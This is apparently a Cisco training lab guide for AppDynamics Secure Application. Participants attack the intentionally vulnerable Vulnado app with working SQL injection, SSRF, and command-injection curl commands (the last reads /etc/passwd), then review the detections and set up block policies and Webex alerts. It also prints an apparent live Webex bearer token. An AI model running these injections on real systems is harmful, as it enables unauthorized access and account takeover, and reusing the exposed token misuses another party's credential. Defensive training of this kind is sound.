Solution Configuration
######################

In this lab, we will:

- Enable the App Security Monitoring feature for your application in AppDynamics Secure Application.
- Execute penetration testing to generate attacks on the Vulnado application. 
- Assess application security issues in AppD Secure Application.
- Create security policies for real-time protection
- Create custom actions to send vulnerability incident alerts to the WebEx room.

1. Enable Application Security Monitoring
=========================================

You will need the following information provided by your instructor to complete this task:

   - AppDynamics SaaS Controller:

        - Host URL
        - AppDynamics Account
        - Username
        - Password
    
#. `Open the AppDynamics controller UI <https://cisco-cx-ps-lab.saas.appdynamics.com/controller/>`_, log in using the AppDynamics account, username and password provided by your instructor, and navigate to the :guilabel:`Security` tab to launch the AppD Secure Application UI.
#. Navigate to :guilabel:`Applications` tab in Secure App UI
#. Select the :guilabel:`check box` for your application 

    .. image:: images/applications.png
            :align: center


#. Click :guilabel:`Security Settings`, select :guilabel:`Enable` and click :guilabel:`Confirm Change` 

    .. image:: images/security-enable.png
        :align: center

2. Execute Penetration Test (pen test)
======================================

A penetration test (pen test) include the tools and technics to simulate authorized attacks against an application to find the weakness and business impacts of the application.


In this task, you will complete the following activities to generate attacks on the Vulnado application:

    - Execute SQL Injection
    - Run Server Side Request Forgery (SSRF)
    - Execute Remote Code Execution

You will need the following information during this exercise (provided by your instructor):

    - CXPM DMZ VPN:
            - VPN URL
            - Username
            - Password

    - SSH access to your application server VM
        - VM IP
        - Username
        - Password         

2.1 SQL Injection to compromise the password of an application user
-------------------------------------------------------------------

SQL injection is the ability of an attacker to execute arbitrary SQL into an insecurely created query. They might do this to attempt to gain access to the system, cause destruction by deleting rows, or list vital information that they should not have access to.

The way SQL injections are constructed is by the use of escape characters such as `'`, which allows an attacker to escape out of the intended query with their own input and execute another query directly against the database.

.. note::

    An example pseudocode for user authentication within the application is as follows:

    .. code-block:: bash

        username := user input from HTML form
        password := user input from HTML form
        hashedPassword := md5(password)

        sql := "select * from admins where username = '" + username "' and password = '" + hashedPassword + "' limit 1"
        executeQuery(sql)


In this exercise, we try to exploit the endpoint ``/login`` using a SQL injection. An example of a valid but unauthorized request looks like this:

``curl -XPOST -H 'Content-Type: application/json' -d '{"username":"rick", "password":"password"}' 'http://localhost:8080/login'``

To execute the SQL injection, perform the following activities:

#. From your laptop terminal, open an SSH connection to your Application Server VM in CXPM DMZ Lab. (Use the credentials provided by your instructor.) 
   (please refer the lab resource table to find the VM IP assigned to your pod) 

#. To gain access as the application user ``rick``, you will be able to successfully change `ricks` password to something we know: ``password`` by running the below command in the terminal:

     .. code-block:: bash

        curl -XPOST -H 'Content-Type: application/json' -d "{\"username\":\"rick'; update users set password=md5('password') where username = 'rick' --\", \"password\":\"foo\"}" 'http://localhost:8080/login'

    .. note::

        We should get an error and that's fine, as an attacker we've broken the JDBC parser and successfully changed ``ricks`` password to something we know: ``password``    

#. Now try logging in with that password we changed to, which is ``password``, run the following command in the terminal:

    .. code-block:: bash

        curl -XPOST -H 'Content-Type: application/json' -d '{"username":"rick", "password":"password"}' 'http://localhost:8080/login' | jq .


2.2 Server Side Request Forgery
-------------------------------

Server side request forgery is a vulnerability that allows attackers to see things from the point of view of their victim. For example, if a web server is available to the public and has to access resources in the private network, an SSRF would be an vulnerability that allows an attacker to see or act upon internal services only by interacting with that web server.
For example, if a web server is available to the public and has to access resources in the private network, an SSRF would be an vulnerability that allows an attacker to see or act upon internal services only by interacting with that web server.

We have an endpoint that will reach out to a website and scrape the HTML for valid links. This is a very common practice for web crawling. You can try it out by running the following link in the terminal:

    .. code-block:: bash

        curl 'http://localhost:8080/links?url=http://wikipedia.com' | jq .


This lab shows that even though you cannot access the internal site from outside, the web server can. Therefore, using a SSRF attack, you can gain valuable information from this internal site such as a list of internal email addresses.


#. Run the following command to get the internal IP address of the Docker network:

      .. code-block:: bash

             docker network inspect vulnado_default | jq -r '.[0].Containers[]|.IPv4Address'

      .. image:: images/docker-net.png
        :align: center


#. Once you have this list try to execute a SSRF attack against the endpoint ``/links``.
   Iterate through your Docker internal IP address and run the following command, using a SSRF attack, you can gain valuable information from this internal site such as a list of internal email address.

      .. code-block:: bash

            curl 'http://localhost:8080/links?url=http://your-docker-internal-ip' | jq .


    .. tip::

             Replace ``your-docker-internal-ip`` with the internal ip your docker network.


    .. image:: images/SSRF-attack-links.png
        :align: center

2.3 Remote Code Execution - RCE
-------------------------------

A remote code injection (RCE) vulnerability gives an attacker to execute remote commands and control in some regard or another of a host server.

This Vulnado application has a vulnerable endpoint that uses a Linux command line utility. Let's try to execute this endpoint that executes the cowsay program on Linux normally:

``$ curl 'http://localhost:8080/cowsay?input=I+Love+Linux!'``

It allows user input. This is a sign that it might have a RCE type of vulnerability if the input is not validated

#. Run the below command to read the details of /etc/passwd in the application server

    .. code-block:: bash
        
           curl "http://localhost:8080/cowsay?input=input%27%3B%20cat+/etc/passwd%20%23"






3. Assess Application Security Issues 
=====================================


In this lab, we will explore how to view and analyze the security incidents, affected entities and suggested remediations with the help of the Application Secure App platform.

3.1 Business Impact scores, BT Vulnerabilities, Kenna and CVSS scores 
---------------------------------------------------------------------

#. `Open the AppDynamics controller UI <https://cisco-cx-ps-lab.saas.appdynamics.com/controller/>`_, log in using the AppDynamics account, username and password provided by your instructor, and navigate to the :guilabel:`Security` tab to launch the AppD Secure Application UI.
#. Navigate to the :guilabel:`Business Transactions` tab and filter by your Application to view business transactions specifically for your application.

   .. image:: images/business-transactions.png
        :align: center
#. Click on the business transaction ``/links`` to view the vulnerabilities, Attacks and API findings associated with that business transaction.

     .. image:: images/bt-details.png
        :align: center

#. Click on ``Remote Code Execution`` vulnerability with id ``CVE-2022-22965``, it will open the vulnerability details page and help us to understand the Kenna scores, CVSS scores, recommendation details etc..

     .. image:: images/RCE-details.png
        :align: center


3.2 Analyze Attacks and Remediations 
------------------------------------

#. Navigate to the :guilabel:`Attacks` tab and filter by your Application to view the attack incidents associated with your application.

   .. image:: images/attacks.png
        :align: center

#. Click on the Attack ID to open the details, which will show the detals like `affected node`, `event that triggered this incident`

    .. image:: images/attack-details.png
        :align: center


#. Expand the :guilabel:`Stack Trace` to view the line of code that affects the attack 
 
    .. image:: images/stack-trace.png
            :align: center



4. Create Security Policies
===========================

Runtime policies define what runtime behaviors to ignore, detect, or block. The runtime events identify all the attacks and vulnerabilities and the action is taken based on the defined runtime policy

To create a policy for an attack or vulnerability at runtime, perform the following steps:

#. Click the gear icon that displayes in the right corner of the Secure Application UI.

    .. image:: images/policy-menu.png
                    :width: 300
                    :align: center


 
#. Click :guilabel:`Policies > Create New Policy`
    
#. Select the following details:

     - **Name**: Command Execution
     - **Application**: your-application-name
     - **Tier**: your-application-tier
     - **Default Action**: Detect
     - **Rules**: click + Rule and configure the below details
        If ``stack trace`` ``contains`` ``org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:834)`` then ``Block``
     - **Enable Policy**: Yes

#. Click :guilabel:`Save`
               

 .. image:: images/policy.png
                    :align: center



5. Create Custom Alert Actions 
=================================

In this lab we focus on the Alerts feature using Cisco Secure Application. The Alerts tab allows you to view, and configure alerts. You can set up Actions to get alerted when new vulnerabilities are detected.

To create an Action:

#. Click the gear icon that displayes in the right corner of the Secure Application UI.

#. Click :guilabel:`Alerts`

    .. image:: images/alert-menu.png
                :width: 300
                :align: center

#. Click :guilabel:`+ Add Action`
#. Enter the Action Name 
    - webexroom-integration-N (replace the N with your pod number)

.. note:: (Do not use special characters in the Action Name.)

#. Choose HTTP as the Action Type and click :guilabel:`Next`
    
#. Enter following Action Details:

        - **Method Type**: POST
        - **Encoding**: UTF-8
        - **Raw URL**: https://webexapis.com/v1/messages
    

#. Click :guilabel:`Next`
    - **Select None or Basic as the Authentication Type**

#. Click :guilabel:`Next`
    
#. Specify following custom headers for the request:
      - **Authorization**: Bearer NjNlMjVjMzUtZmFlMi00MTZiLWExYzgtNjY5YzgzZWRlZjBjZDQ1NjMxYjItODAy_PF84_1eb65fdf-9643-417f-9974-ad72cae0e10f


#. Add the payload. The payload must be in JSON format. You can copy and paste the below payload into the Editor.

    .. code-block:: bash

        {
            "roomId": "Y2lzY29zcGFyazovL3VzL1JPT00vMGRlNWU2ZDAtYzI3Yi0xMWVkLTkwOTUtMWZjODAwZjk1NTMy",
        "html" : "<p>Vulnerability has been detected as follows: <br> $vulnerability.id <br>$vulnerability.title <br>$vulnerability.application<br> KennaScore: $vulnerability.kenna.score </p>",
        "text": "Vulnerability has been detected."

        }

    .. image:: images/payload.png
                    :align: center

#. Click :guilabel:`Next`

#. Click :guilabel:`cURL` to copy the request to test

    .. image:: images/review-action.png
                    :align: center

#. Click :guilabel:`Save`.
    
#. You can navigate to :guilabel:`Rules` tab, a new rule associated with the your action will be automatically created.



.. sectionauthor:: Ansood Anandan <anananda@cisco.com>

